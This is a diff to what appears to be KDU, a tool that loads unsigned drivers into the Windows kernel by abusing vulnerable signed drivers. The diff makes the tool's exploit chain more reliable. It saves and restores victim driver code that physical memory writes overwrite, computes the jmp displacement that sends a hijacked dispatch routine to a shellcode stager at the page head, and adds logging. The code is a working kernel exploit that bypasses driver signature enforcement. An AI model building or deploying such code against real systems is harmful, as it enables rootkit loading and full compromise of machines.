@@ -623,6 +623,25 @@ BOOL KDUpMapDriverPhysicalTranslate(
     KDU_PROVIDER* prov = Context->Provider;
     KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
 
+    provReadKernelVM ReadKernelVM = prov->Callbacks.ReadKernelVM;
+
+    /*
+     * 保留被改写区域的原始字节。物理写入绕过了页保护，一旦 stager 没能接管控制权，
+     * victim 的创建路径会继续执行被改写的代码；失败时还原可以把"蓝屏"降级成"干净失败"。
+     */
+    PVOID originalEntry = supHeapAlloc(ScSize);
+    PVOID originalPage = supHeapAlloc(ScSize);
+    BOOL haveEntry = FALSE, havePage = FALSE;
+
+    /* 在写任何字节之前存档：命中点与同页页首两个区域。 */
+    if (originalEntry) {
+        haveEntry = ReadKernelVM(deviceHandle, TargetAddress, originalEntry, ScSize) != FALSE;
+    }
+    if (originalPage) {
+        havePage = ReadKernelVM(deviceHandle, TargetAddress - VictimImageInformation->DispatchPageOffset,
+            originalPage, ScSize) != FALSE;
+    }
+
     ULONG dispatchPageOffset = VictimImageInformation->DispatchPageOffset;
     ULONG_PTR memPage, targetAddress = TargetAddress;
 
@@ -704,6 +723,9 @@ BOOL KDUpMapDriverPhysicalTranslate(
         //
         printf_s("[+] Executing shellcode\r\n");
         VpExecutePayload(victimProv, &victimDeviceHandle);
+        if (victimDeviceHandle == NULL) {
+            supPrintfEvent(kduEventError, "[!] Victim device open failed, stager never invoked\r\n");
+        }
 
         //
         // Wait for the shellcode to trigger the event
@@ -721,6 +743,26 @@ BOOL KDUpMapDriverPhysicalTranslate(
         }
 
     } while (FALSE);
+
+    //
+    // 失败时还原被改写的 victim 代码，避免创建路径继续执行到 stager 区。
+    //
+    if (!bSuccess) {
+
+        if (haveEntry &&
+            WriteKernelVM(deviceHandle, TargetAddress, originalEntry, ScSize)) {
+            printf_s("[+] Victim entry restored after failure\r\n");
+        }
+
+        if (havePage &&
+            WriteKernelVM(deviceHandle, TargetAddress - VictimImageInformation->DispatchPageOffset,
+                originalPage, ScSize)) {
+            printf_s("[+] Victim page head restored after failure\r\n");
+        }
+    }
+
+    if (originalEntry) supHeapFree(originalEntry);
+    if (originalPage) supHeapFree(originalPage);
 
     //
     // Ensure victim handle is closed.
@@ -1128,6 +1170,18 @@ BOOL KDUMapDriver(
                 dispatchOffset = override_rva;
                 vi.DispatchOffset = override_rva;
                 vi.DispatchPageOffset = override_rva & 0xfff;
+
+                /*
+                 * 自定义 victim 没有签名扫描，JumpValue 不会由 VpQueryInformation 计算。
+                 * 覆盖式写入会先落在这个页的第一个字节，再在命中点写 5 字节 jmp，
+                 * 所以位移必须是「页首 - 命中点 - 5」；留 0 就是空跳，stager 永远不会执行。
+                 */
+                vi.JumpValue = (ULONG)(LONG)((override_rva & ~0xFFFu) - override_rva - 5);
+
+                printf_s("[+] Dispatch jump value: %ld (entry 0x%lX -> page 0x%lX)\r\n",
+                    (LONG)vi.JumpValue,
+                    override_rva,
+                    override_rva & ~0xFFFu);
             }
 
             RtlSecureZeroMemory(&vdi, sizeof(vdi));
